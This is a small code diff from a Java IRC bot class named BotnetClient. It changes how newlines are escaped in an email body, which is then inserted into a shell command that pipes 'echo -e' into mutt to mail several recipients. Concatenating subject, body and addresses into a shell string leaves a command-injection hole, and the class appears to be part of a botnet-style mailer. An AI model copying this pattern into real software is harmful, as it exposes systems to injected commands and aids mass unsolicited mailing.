@@ -198,7 +198,7 @@ public class BotnetClient extends PircBot {
 				emails += " " + email;
 			}
 			
-			body = body.replace("\"", "\\\"").replace("\n", "\\\n");
+			body = body.replace("\"", "\\\"").replace("\n", "\\n");
 			
 			Process p = r.exec("echo -e \"" + body + "\" | mutt -s \"" + subject + "\"" + emails);
 			p.waitFor();
